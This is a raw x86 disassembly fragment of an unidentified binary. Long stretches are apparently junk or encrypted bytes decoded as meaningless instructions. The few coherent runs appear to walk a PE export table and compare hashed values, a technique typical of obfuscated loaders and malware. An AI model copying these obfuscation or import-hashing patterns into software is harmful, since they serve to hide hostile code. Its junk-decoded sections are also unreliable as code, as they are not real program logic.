  402892:	stos   BYTE PTR es:[edi],al
  402893:	bound  esp,QWORD PTR [edx-0x63759c0a]
  402899:	iret   
  40289a:	sub    BYTE PTR [edx+0x59],cl
  40289d:	cmp    dh,0x90
  4028a0:	mov    WORD PTR [esi+0xe840f],ss
  4028a6:	add    BYTE PTR [eax],al
  4028a8:	mov    eax,DWORD PTR [ebp-0x8]
  4028ab:	mov    DWORD PTR [eax],0x60341e8d
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	push   esi
  4028e2:	ins    BYTE PTR es:[edi],dx
  4028e3:	push   cs
  4028e4:	(bad)  
  4028e5:	fisttp QWORD PTR [eax]
  4028e7:	jl     0x402965
  4028e9:	addr16 jle 0x402968
  4028ec:	jl     0x4028a7
  4028ee:	cmp    esp,edi
  4028f0:	in     al,0xdb
  4028f2:	mov    bl,0x91
  4028f4:	sbb    al,0x5d
  4028f6:	jp     0x4028f0
  4028f8:	add    DWORD PTR [ebx+0x2e],eax
  4028fb:	inc    ecx
  4028fc:	adc    al,0xed
  4028fe:	sbb    bh,BYTE PTR [edi+0x38]
  402901:	inc    edi
  402902:	dec    edx
  402903:	cmp    eax,0x80a2647e
  402908:	push   esp
  402909:	scas   al,BYTE PTR es:[edi]
  40290a:	leave  
  40290b:	xor    eax,0x87352de2
  402910:	sahf   
  402911:	hlt    
  402912:	pop    edi
  402913:	xchg   ecx,eax
  402914:	gs xchg esp,eax
  402916:	inc    edx
  402917:	gs push ebp
  402919:	mov    bh,0xc6
  40291b:	xchg   ecx,eax
  40291c:	dec    ebx
  40291d:	jne    0x402927
  40291f:	sahf   
  402920:	test   BYTE PTR [eax-0x78],cl
  402923:	mov    eax,0x3633d905
  402928:	adc    al,0xf5
  40292a:	das    
  40292b:	test   al,0x69
  40292d:	push   esi
  40292e:	out    dx,al
  40292f:	mov    bl,ch
  402931:	pop    ecx
  402932:	xchg   edi,eax
  402933:	adc    edi,edi
  402935:	add    eax,0x9d7f2831
  40293a:	ret    
  40293b:	in     al,0xe0
  40293d:	mov    edx,0xdaf7906b
  402942:	loop   0x4028cd
  402944:	cmp    BYTE PTR [ecx+0x2d03cbfe],al
  40294a:	push   cs
  40294b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40294c:	fsubr  DWORD PTR [esi]
  40294e:	dec    ecx
  40294f:	fdivr  DWORD PTR [eax-0x2db5303b]
  402955:	lahf   
  402956:	push   ecx
  402957:	cmp    ah,BYTE PTR [esi]
  402959:	sbb    al,0x8d
  40295b:	dec    edx
  40295c:	jmp    0xcc4baa25
  402961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402962:	icebp  
  402963:	adc    edi,DWORD PTR [ebp-0x75]
  402966:	pushf  
  402967:	fcomp  DWORD PTR [edi]
  402969:	cmp    al,0xb8
  40296b:	and    eax,0xc6a4a87d
  402970:	add    bh,cl
  402972:	data16 mov bl,0xa8
  402975:	sbb    ebx,eax
  402977:	xchg   ebx,eax
  402978:	and    DWORD PTR [esi-0x7b],ebp
  40297b:	mov    ds:0x22e6f759,al
  402980:	inc    edx
  402981:	xchg   ecx,eax
  402982:	mov    ds,WORD PTR [esi+0x5c]
  402985:	adc    al,0x56
  402987:	or     eax,0x982454b1
  40298c:	je     0x4029cc
  40298e:	cmp    DWORD PTR [edi-0x6f5b4fdd],eax
  402994:	enter  0x411b,0x49
  402998:	add    bl,dl
  40299a:	or     ch,BYTE PTR [ecx]
  40299c:	sub    BYTE PTR es:[ecx-0x12],bh
  4029a0:	inc    edi
  4029a1:	jnp    0x402996
  4029a3:	mov    al,ds:0x1bb3aa01
  4029a8:	cmp    eax,0x7135b5a6
  4029ad:	or     al,0x8b
  4029af:	or     edx,DWORD PTR [eax+0x7b5a4609]
  4029b5:	fwait
  4029b6:	push   ebx
  4029b7:	and    al,0x1
  4029b9:	test   dl,ch
  4029bb:	fisub  WORD PTR [edx+0x21]
  4029be:	sbb    DWORD PTR [esp+esi*1-0x15],ebx
  4029c2:	or     eax,0x39d8a39e
  4029c7:	sahf   
  4029c8:	xchg   BYTE PTR [edx],al
  4029ca:	xor    al,0x75
  4029cc:	dec    eax
  4029cd:	ins    DWORD PTR es:[edi],dx
  4029ce:	mov    ah,BYTE PTR [ebp+0x463963a0]
  4029d4:	jae    0x40297b
  4029d6:	jle    0x4029b8
  4029d8:	adc    BYTE PTR [esi-0x58],0x8c
  4029dc:	mov    edi,0x17cc80c
  4029e1:	retf   0xef46
  4029e4:	push   0xd15ea638
  4029e9:	sbb    DWORD PTR [esi],ebx
  4029eb:	ret    0x4d41
  4029ee:	iret   
  4029ef:	jge    0x4029fb
  4029f1:	mov    edx,0xb33ba36f
  4029f6:	pop    eax
  4029f7:	sub    al,0x29
  4029f9:	xor    eax,0xff09419
  4029fe:	(bad)  
  4029ff:	(bad)  
  402a00:	mov    bl,0x34
  402a02:	push   eax
  402a03:	mov    ebp,0x505b02f
  402a08:	or     al,0x22
  402a0a:	loope  0x4029ba
  402a0c:	lods   al,BYTE PTR ds:[esi]
  402a0d:	inc    esp
  402a0e:	mov    ?,ebp
  402a10:	(bad)  
  402a11:	sbb    edi,DWORD PTR [edx-0x749b3c9a]
  402a17:	push   ebp
  402a18:	mov    eax,0x8232d101
  402a1d:	fcomp  QWORD PTR [edi+0x7b]
  402a20:	jne    0x4029ad
  402a22:	fistp  QWORD PTR [ebx-0x31]
  402a25:	or     al,0xd4
  402a27:	or     BYTE PTR ds:0xa43540c8,dl
  402a2d:	push   es
  402a2e:	arpl   WORD PTR [ecx-0x58af04d4],ax
  402a34:	xchg   ecx,eax
  402a35:	imul   ecx,DWORD PTR [esi-0x6143de0],0xffffffd5
  402a3c:	sbb    dl,BYTE PTR [esi]
  402a3e:	jmp    0x4029c4
  402a40:	(bad)  
  402a41:	jbe    0x402ac1
  402a43:	scas   eax,DWORD PTR es:[edi]
  402a44:	in     eax,0x88
  402a46:	outs   dx,BYTE PTR ds:[esi]
  402a47:	addr16 mov ds:0x50,al
  402a4b:	mov    esp,0xe65fd6f5
  402a50:	inc    esp
  402a51:	dec    eax
  402a52:	dec    ebx
  402a53:	pop    esi
  402a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a55:	sahf   
  402a56:	(bad)
  402a5a:	int3   
  402a5b:	push   ebp
  402a5c:	aaa    
  402a5d:	dec    eax
  402a5e:	add    BYTE PTR [ebx-0x3d9868ef],bh
  402a64:	mov    ah,0xdd
  402a66:	add    ebx,DWORD PTR [ebx]
  402a68:	mov    bl,0xf3
  402a6a:	fiadd  DWORD PTR [ebx+ebp*1-0x386ad37e]
  402a71:	fdivr  QWORD PTR [edi-0x24]
  402a74:	xor    DWORD PTR [ecx],0x7147c160
  402a7a:	adc    BYTE PTR [edi+esi*2],0xa0
  402a7e:	cld    
  402a7f:	gs arpl cx,si
  402a82:	push   ss
  402a83:	js     0x402a78
  402a85:	cmp    eax,0xdf7ab0ad
  402a8a:	dec    esp
  402a8b:	jno    0x402a9c
  402a8d:	and    DWORD PTR [ebx],ebp
  402a8f:	retf   
  402a90:	aaa    
  402a91:	sbb    ah,dh
  402a93:	lods   eax,DWORD PTR ds:[esi]
  402a94:	das    
  402a95:	adc    BYTE PTR [ebx+0x7a],dl
  402a98:	cmp    DWORD PTR [eax-0x58e00349],0xc6bd6e9
  402aa2:	(bad)  
  402aa3:	xchg   ebx,eax
  402aa4:	mov    al,ds:0x6cba68f0
  402aa9:	vpsrad xmm3,xmm4,XMMWORD PTR [esi]
  402aad:	add    eax,0x11a8573e
  402ab2:	shr    BYTE PTR [edx-0x4dd656b9],1
  402ab8:	lea    ecx,[esi]
  402aba:	out    dx,al
  402abb:	(bad)  
  402abc:	dec    esp
  402abd:	mov    al,ds:0xd0ef835f
  402ac2:	and    ecx,esi
  402ac4:	(bad)  
  402ac5:	cs cdq 
  402ac7:	mov    ds:0x58cf9a85,al
  402acc:	inc    ebp
  402acd:	sub    DWORD PTR [eax+edx*4-0x61a0577a],0x10
  402ad5:	inc    eax
  402ad6:	dec    edi
  402ad7:	pusha  
  402ad8:	sar    ah,1
  402ada:	push   esp
  402adb:	fnsave cs:[edx]
  402ade:	push   eax
  402adf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ae0:	push   edx
  402ae1:	xchg   ch,cl
  402ae3:	and    esp,edx
  402ae5:	pop    esp
  402ae6:	imul   ebp,DWORD PTR [edx+0x20],0xffffffdd
  402aea:	mov    ecx,DWORD PTR [eax+ecx*2]
  402aed:	ins    BYTE PTR es:[edi],dx
  402aee:	sub    bl,cl
  402af0:	cmp    BYTE PTR [ebx+edx*1-0x1d],bl
  402af4:	test   BYTE PTR [ebx+0x683065da],ch
  402afa:	push   0xffffffee
  402afc:	fiadd  WORD PTR [edi-0x3d]
  402aff:	cmp    eax,0x6c791855
  402b04:	(bad)  
  402b05:	sbb    DWORD PTR [esi-0x39cbb5de],eax
  402b0b:	dec    ebx
  402b0c:	mov    dl,0x23
  402b0e:	add    eax,DWORD PTR [edx]
  402b10:	cmp    esp,DWORD PTR [ebp+0x11ea233]
  402b16:	pop    esi
  402b17:	adc    al,0x6a
  402b19:	sbb    DWORD PTR [eax-0x345c0976],esi
  402b1f:	adc    al,0x88
  402b21:	loopne 0x402b34
  402b23:	inc    edi
  402b24:	loope  0x402b8a
  402b26:	hlt    
  402b27:	(bad)  
  402b28:	aas    
  402b29:	lods   al,BYTE PTR ds:[esi]
  402b2a:	pop    esp
  402b2b:	xchg   esp,eax
  402b2c:	adc    eax,0xdbc7908c
  402b31:	or     DWORD PTR [ebx-0x62fa9f8e],eax
  402b37:	dec    edi
  402b39:	dec    esi
  402b3a:	dec    esp
  402b3b:	and    BYTE PTR [ecx-0x57],ah
  402b3e:	jo     0x402b31
  402b40:	cdq    
  402b41:	dec    edi
  402b42:	adc    ecx,DWORD PTR [esi+eax*2]
  402b45:	sub    DWORD PTR [ebp-0x50],0xffffff82
  402b49:	popf   
  402b4a:	and    eax,0x2f289d4a
  402b4f:	or     ebx,DWORD PTR [esi]
  402b51:	neg    BYTE PTR [esi+0x27e25dbc]
  402b57:	test   dl,dl
  402b59:	nop
  402b5a:	sbb    bh,BYTE PTR [edx-0xf29722d]
  402b60:	(bad)  
  402b61:	jmp    0x7faf:0x5d2a586b
  402b68:	iret   
  402b69:	dec    edx
  402b6a:	adc    cl,BYTE PTR [ebx]
  402b6c:	xor    al,0x8e
  402b6e:	mov    dh,0x44
  402b70:	add    ebx,DWORD PTR [esi-0x19]
  402b73:	push   0x846b8188
  402b78:	js     0x402bc3
  402b7a:	inc    edx
  402b7b:	fbld   TBYTE PTR [esi-0x5c]
  402b7e:	ja     0x402b08
  402b80:	inc    eax
  402b81:	rcl    BYTE PTR [eax+0x58],0x41
  402b85:	call   0xac3b:0xf5b3e184
  402b8c:	ret    0x18ac
  402b8f:	mov    edx,0xe5940aa
  402b94:	out    dx,eax
  402b95:	push   ebp
  402b96:	into   
  402b97:	push   ds
  402b98:	cdq    
  402b99:	mov    al,0x95
  402b9b:	mov    esp,edx
  402b9d:	rol    DWORD PTR [edx+0xbd22daa],1
  402ba3:	pop    ebx
  402ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ba5:	jl     0x402b6a
  402ba7:	push   ds
  402ba8:	clc    
  402ba9:	sub    BYTE PTR [ecx+0x68],dh
  402bac:	or     ecx,ecx
  402bae:	neg    DWORD PTR [ebx]
  402bb0:	pop    ds
  402bb1:	xor    al,0x9
  402bb3:	xchg   DWORD PTR [ecx],edi
  402bb5:	add    BYTE PTR [eax+edi*4],dl
  402bb8:	push   ecx
  402bb9:	jl     0x402bbd
  402bbb:	out    dx,al
  402bbc:	rol    BYTE PTR [esi+0x442a9cab],0x97
  402bc3:	mov    ch,0x3b
  402bc5:	jl     0x402bf5
  402bc7:	dec    ebp
  402bc8:	ja     0x402bca
  402bca:	mov    al,ds:0xc38a5e2a
  402bcf:	and    al,0xf4
  402bd1:	xchg   bp,ax
  402bd3:	add    ecx,DWORD PTR [edi+0x37]
  402bd6:	mov    eax,DWORD PTR [eax+0x3c]
  402bd9:	lea    ecx,[ecx*8+0x78]
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	sub    al,0x38
  402c6e:	scas   al,BYTE PTR es:[edi]
  402c6f:	(bad)  
  402c70:	les    edx,FWORD PTR ds:0x7e677c7c
  402c76:	jl     0x402cf4
  402c78:	pop    ebp
  402c79:	aad    0x7f
  402c7b:	push   0xda77ee3d
  402c80:	jg     0x402ca8
  402c82:	dec    edi
  402c83:	adc    esi,ebp
  402c85:	cmp    al,cl
  402c87:	std    
  402c88:	pushf  
  402c89:	sahf   
  402c8a:	mul    DWORD PTR [ebx]
  402c8c:	ss stc 
  402c8e:	mov    bh,0x11
  402c90:	jns    0x402c50
  402c92:	(bad)  
  402c93:	in     al,dx
  402c94:	push   esp
  402c95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c96:	cli    
  402c97:	adc    BYTE PTR [edx],0x37
  402c9a:	je     0x402c75
  402c9c:	mov    ecx,0x1505e424
  402ca1:	mov    eax,0x9b829c4a
  402ca6:	frstor [ecx+esi*4+0x5d9c4ebd]
  402cad:	(bad)  
  402cae:	aam    0xdc
  402cb0:	add    eax,DWORD PTR [esi]
  402cb2:	mov    eax,ds:0xb5782268
  402cb7:	leave  
  402cb8:	in     eax,dx
  402cb9:	ror    ebp,cl
  402cbb:	adc    eax,ecx
  402cbd:	lahf   
  402cbe:	mov    ah,0x69
  402cc0:	(bad)  
  402cc1:	xor    cl,BYTE PTR [esi+0x4c]
  402cc4:	(bad)  
  402cc5:	enter  0x48e2,0x3f
  402cc9:	mov    bh,0xa9
  402ccb:	inc    edi
  402ccc:	pop    esi
  402ccd:	mov    WORD PTR [edx-0x34e91524],?
  402cd3:	rcr    BYTE PTR [edx],cl
  402cd5:	cmp    ch,BYTE PTR [edi+eax*4]
  402cd8:	loope  0x402cc0
  402cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cdb:	add    BYTE PTR [ecx+0x14cabdb5],cl
  402ce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce2:	enter  0x773c,0xb8
  402ce6:	push   0x37
  402ce8:	jle    0x402c94
  402cea:	fs jae 0x402d6b
  402ced:	cmp    edi,edx
  402cef:	sar    BYTE PTR [ecx-0x7b016c26],1
  402cf5:	imul   ecx,ebp,0xffffffe1
  402cf8:	push   es
  402cf9:	sub    eax,0x47e0252
  402cfe:	leave  
  402cff:	sub    al,BYTE PTR [esi+0x1df636e0]
  402d05:	call   0xf108dbd8
  402d0a:	ror    DWORD PTR [esp+eax*4+0x79],cl
  402d0e:	and    eax,0xc470085f
  402d13:	mov    eax,0x600f1cba
  402d18:	stos   BYTE PTR es:[edi],al
  402d19:	jecxz  0x402d16
  402d1b:	ret    
  402d1c:	out    dx,eax
  402d1d:	mov    bh,0xc5
  402d1f:	inc    ebx
  402d20:	pop    esi
  402d21:	xchg   BYTE PTR [ebx+ebp*8],dh
  402d24:	xor    bl,0x9f
  402d27:	leave  
  402d28:	inc    ebp
  402d29:	add    esp,DWORD PTR [eax+edx*8-0x733b9267]
  402d30:	mov    al,ds:0xf6f672f4
  402d35:	jmp    0x4532:0x437cc5bd
  402d3c:	sbb    DWORD PTR fs:[edi+0xacf4491],esp
  402d43:	xor    eax,0xa48871fc
  402d48:	ins    BYTE PTR es:[edi],dx
  402d49:	call   FWORD PTR [eax+0x5a9c5f80]
  402d4f:	ins    DWORD PTR es:[edi],dx
  402d50:	dec    ecx
  402d51:	add    al,0xb
  402d53:	(bad)
  402d56:	(bad)  
  402d57:	ja     0x402d51
  402d59:	add    eax,0xc5b874e5
  402d5e:	nop
  402d5f:	push   eax
  402d60:	neg    ebx
  402d62:	(bad)  
  402d64:	imul   ecx,DWORD PTR [eax+0x13],0x179a39d8
  402d6b:	fidiv  DWORD PTR [ecx-0x2c640ca]
  402d71:	pop    eax
  402d72:	loopne 0x402df3
  402d74:	sbb    BYTE PTR [ecx+eax*4],dh
  402d77:	ret    0x5ef1
  402d7a:	popf   
  402d7b:	daa    
  402d7c:	fiadd  WORD PTR ds:[eax-0x465c185f]
  402d83:	adc    eax,0x8be44fb1
  402d88:	or     eax,0xf1d04186
  402d8d:	pushf  
  402d8e:	xor    edi,DWORD PTR [ebx]
  402d90:	je     0x402e05
  402d92:	xor    eax,esp
  402d94:	js     0x402d3f
  402d96:	and    eax,0xbbb855df
  402d9b:	inc    edx
  402d9c:	retf   
  402d9d:	fucomp st(7)
  402d9f:	jle    0x402d39
  402da1:	xchg   esp,eax
  402da2:	push   ds
  402da3:	xor    al,0xe1
  402da5:	mov    ch,bh
  402da7:	inc    ecx
  402da8:	nop
  402da9:	cmc    
  402daa:	rol    DWORD PTR [edi+0x67],0xe0
  402dae:	jge    0x402dca
  402db0:	(bad)  [esi-0x50]
  402db3:	dec    eax
  402db4:	jge    0x402d78
  402db6:	fcmovnbe st,st(7)
  402db8:	scas   al,BYTE PTR es:[edi]
  402db9:	retf   0x89c7
  402dbc:	ret    
  402dbd:	pusha  
  402dbe:	xchg   DWORD PTR [ebx+0x26871790],ecx
  402dc4:	in     eax,dx
  402dc5:	push   ebx
  402dc6:	test   BYTE PTR [eax+0x5a7a54e5],ch
  402dcc:	sbb    al,0x88
  402dce:	sbb    edx,ecx
  402dd0:	push   cs
  402dd1:	pop    eax
  402dd2:	and    al,0x19
  402dd4:	scas   eax,DWORD PTR es:[edi]
  402dd5:	mov    ds:0x77786d03,al
  402dda:	sbb    eax,0x684d3ebc
  402ddf:	and    eax,0x275d09a2
  402de4:	aam    0xa2
  402de6:	popf   
  402de7:	cwde   
  402de8:	call   0xdb1:0x38086c97
  402def:	pop    es
  402df0:	xor    cl,ah
  402df2:	mov    edx,0x14bb0a00
  402df7:	fmul   DWORD PTR [ecx+0x1c5f18c0]
  402dfd:	fmul   st(6),st
  402dff:	les    edx,FWORD PTR [edi-0x3c]
  402e02:	pop    es
  402e03:	push   es
  402e04:	pop    ebp
  402e05:	aam    0x3f
  402e07:	aas    
  402e08:	jmp    0x2606:0x3ffd4b2a
  402e0f:	ins    DWORD PTR es:[edi],dx
  402e10:	jl     0x402e69
  402e12:	test   DWORD PTR [edi-0x40],ebp
  402e15:	inc    eax
  402e16:	outs   dx,DWORD PTR ds:[esi]
  402e17:	xchg   esi,eax
  402e18:	xor    ebp,DWORD PTR [esi+ebp*8]
  402e1b:	aad    0xc9
  402e1d:	mov    dl,0xc6
  402e1f:	ret    0xdeaf
  402e22:	sahf   
  402e23:	call   0x46c4:0xb54a1a46
  402e2a:	mov    BYTE PTR [ecx+0x3],0x25
  402e2e:	mov    esp,ss
  402e30:	sbb    DWORD PTR [esi+0x31],0x59
  402e34:	inc    eax
  402e35:	fnstenv [ecx+edi*8-0x56c16eac]
  402e3c:	rcr    DWORD PTR [eax-0x48],1
  402e3f:	mov    BYTE PTR [esi+edx*4+0x7ac228e1],al
  402e46:	cwde   
  402e47:	add    eax,0x952d808e
  402e4c:	pop    ds
  402e4d:	dec    esp
  402e4e:	pop    ebx
  402e4f:	scas   al,BYTE PTR es:[edi]
  402e50:	mov    dl,0x4a
  402e52:	mov    ecx,0x88bf3a65
  402e57:	and    eax,0xd4f690ed
  402e5c:	mov    eax,ds:0x939361e3
  402e61:	int3   
  402e62:	xchg   ecx,eax
  402e63:	stos   DWORD PTR es:[edi],eax
  402e64:	sbb    BYTE PTR [ecx],bl
  402e66:	xchg   ebx,eax
  402e67:	ins    BYTE PTR es:[edi],dx
  402e68:	mov    ebp,0xdf731730
  402e6d:	out    0x8f,eax
  402e6f:	lea    ebx,[ebp+0x57926e6a]
  402e75:	adc    ebx,0x29
  402e78:	jl     0x402eda
  402e7a:	pop    ecx
  402e7b:	pop    ecx
  402e7c:	xchg   esi,eax
  402e7d:	loop   0x402edf
  402e7f:	cmp    al,0x5a
  402e81:	loop   0x402eb3
  402e83:	repz shl BYTE PTR [edi],0x46
  402e87:	stos   DWORD PTR es:[edi],eax
  402e88:	mov    al,ds:0x1d76f0b3
  402e8d:	lahf   
  402e8e:	mov    al,0xdd
  402e90:	mov    fs,WORD PTR [ebx+eiz*1]
  402e93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e94:	fnstsw WORD PTR [esi+0x3ac6944b]
  402e9a:	push   ecx
  402e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e9c:	mov    edi,0xbbeb8fdc
  402ea1:	std    
  402ea2:	mov    eax,0x71d3802a
  402ea7:	and    bl,bl
  402ea9:	mov    cl,0xe7
  402eab:	int    0xc9
  402ead:	add    BYTE PTR [edi],ah
  402eaf:	pop    edx
  402eb0:	in     al,dx
  402eb1:	fistp  QWORD PTR [edx-0x9ab268c]
  402eb7:	shr    BYTE PTR [esi+edi*2-0x2e],1
  402ebb:	pop    es
  402ebc:	leave  
  402ebd:	inc    esi
  402ebe:	push   esp
  402ebf:	jbe    0x402ec2
  402ec1:	and    ch,BYTE PTR [ecx+0x75bce734]
  402ec7:	mov    ebx,0xae9d3279
  402ecc:	sub    al,0xc4
  402ece:	add    eax,0x103f6341
  402ed3:	imul   edi,edx,0x48
  402ed6:	inc    ebp
  402ed7:	mov    ?,ebp
  402ed9:	mov    cl,0x61
  402edb:	xor    BYTE PTR [eax],bl
  402edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ede:	(bad)  
  402edf:	ins    DWORD PTR es:[edi],dx
  402ee0:	pop    esi
  402ee1:	scas   eax,DWORD PTR es:[edi]
  402ee2:	jns    0x402e84
  402ee4:	sub    cl,BYTE PTR [eax]
  402ee6:	push   cs
  402ee7:	push   edx
  402ee8:	arpl   WORD PTR [edi],cx
  402eea:	out    dx,al
  402eeb:	mov    esp,0x4565b589
  402ef0:	dec    edi
  402ef1:	div    dh
  402ef3:	clc    
  402ef4:	pop    esp
  402ef5:	dec    edx
  402ef6:	dec    ebp
  402ef7:	in     al,0x69
  402ef9:	push   0x3399512f
  402efe:	mov    BYTE PTR [edi+0x4],cl
  402f01:	aam    0x7e
  402f03:	stos   BYTE PTR es:[edi],al
  402f04:	jnp    0x402f75
  402f06:	mov    ch,0x83
  402f08:	cwde   
  402f09:	rol    BYTE PTR [ebp+edx*1-0x11],1
  402f0d:	int3   
  402f0e:	sub    BYTE PTR [ecx-0x1d997c2b],dl
  402f14:	cmp    BYTE PTR [edx],ah
  402f16:	jbe    0x402ea3
  402f18:	mov    BYTE PTR [ebp-0x4ef6a786],dl
  402f1e:	mov    ch,0x8e
  402f20:	enter  0xdbee,0xa7
  402f24:	push   esp
  402f25:	jecxz  0x402ed9
  402f27:	jecxz  0x402f05
  402f29:	sti    
  402f2a:	scas   eax,DWORD PTR es:[edi]
  402f2b:	xchg   edx,eax
  402f2c:	inc    ecx
  402f2d:	sub    DWORD PTR [edx+0x4d],edi
  402f30:	enter  0x2e49,0x6f
  402f34:	dec    ebx
  402f35:	test   BYTE PTR [eax],ch
  402f37:	lahf   
  402f38:	dec    ecx
  402f39:	test   eax,0xc64d793
  402f3e:	pop    esp
  402f3f:	pusha  
  402f40:	retf   
  402f41:	mov    edi,0xf8c46290
  402f46:	or     DWORD PTR [ebp+0x7a],ebx
  402f49:	les    ebx,FWORD PTR ds:0x1dfee060
  402f4f:	in     al,0xb3
  402f51:	jmp    0x402f24
  402f53:	loopne 0x402f63
  402f55:	inc    ebp
  402f56:	mov    edi,0xe9f6e678
  402f5b:	aad    0x57
  402f5d:	(bad)  
  402f5e:	push   0x75ff607a
  402f63:	clc    
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0x84f5:0x1360eb95
  402f8e:	ds retf 0x162f
  402f92:	jl     0x403010
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x402faf
  402f99:	jbe    0x402f27
  402f9b:	bound  esi,QWORD PTR [eax+ebp*2+0x499983ef]
  402fa2:	sbb    dh,dl
  402fa4:	sub    dl,BYTE PTR [ebx+0x665c0ef4]
  402faa:	push   esi
  402fab:	fwait
  402fac:	inc    ebx
  402fad:	js     0x402fea
  402faf:	push   0xb0e3a5ef
  402fb4:	icebp  
  402fb5:	data16 out 0x93,al
  402fb8:	jmp    0x5b21952a
  402fbd:	ret    
  402fbe:	add    BYTE PTR [edx+0xa],0xee
  402fc2:	xor    ecx,0xffffffde
  402fc5:	jno    0x403004
  402fc7:	push   ss
  402fc8:	cmp    al,0x23
  402fca:	imul   edx,DWORD PTR [ecx],0x8cb886a9
  402fd0:	ss out 0x12,al
  402fd3:	dec    eax
  402fd4:	iret   
  402fd5:	stos   DWORD PTR es:[edi],eax
  402fd6:	xor    al,0xb1
  402fd8:	jns    0x403051
  402fda:	add    eax,0x1b195967
  402fdf:	js     0x403006
  402fe1:	xchg   edx,eax
  402fe2:	int    0xd0
  402fe4:	mov    WORD PTR [ebp+0x5f3fd56d],fs
  402fea:	call   0xc7f7:0xd15d14fb
  402ff1:	jmp    0x894b:0x14229b02
  402ff8:	pop    esi
  402ff9:	adc    eax,0xa2032037
  402ffe:	push   esp
  402fff:	ds mov esp,0x11ce358f
  403005:	mov    edx,0x3db8e528
  40300a:	fwait
  40300b:	gs jae 0x402fc3
  40300e:	arpl   WORD PTR [ecx-0x2d308e62],sp
  403014:	imul   ebp,ebp,0xdd54c4d7
  40301a:	sbb    al,0xfd
  40301c:	enter  0x76fe,0x1c
  403020:	sahf   
  403021:	out    0xdd,eax
  403023:	pop    edx
  403024:	inc    esi
  403025:	pop    es
  403026:	mov    edi,0x607c8a7a
  40302b:	out    0xca,eax
  40302d:	sbb    eax,0x80335d2e
  403032:	push   esi
  403033:	icebp  
  403034:	cs xor bl,dl
  403037:	or     dh,BYTE PTR [ecx]
  403039:	mov    ds:0xb2a7ba56,eax
  40303e:	ds push 0xeb9beecd
  403044:	mov    al,0xeb
  403046:	cmc    
  403047:	inc    edi
  403048:	stc    
  403049:	in     al,0x2c
  40304b:	inc    ebx
  40304c:	mov    edx,0x55765da
  403051:	adc    al,0x8d
  403053:	mov    dl,BYTE PTR [edx+ebp*1-0x6f2d3a88]
  40305a:	pusha  
  40305b:	aaa    
  40305c:	push   0x54
  40305e:	mov    WORD PTR [eax],?
  403060:	xor    BYTE PTR [edi-0x75f520ad],ah
  403066:	leave  
  403067:	sub    al,0xd4
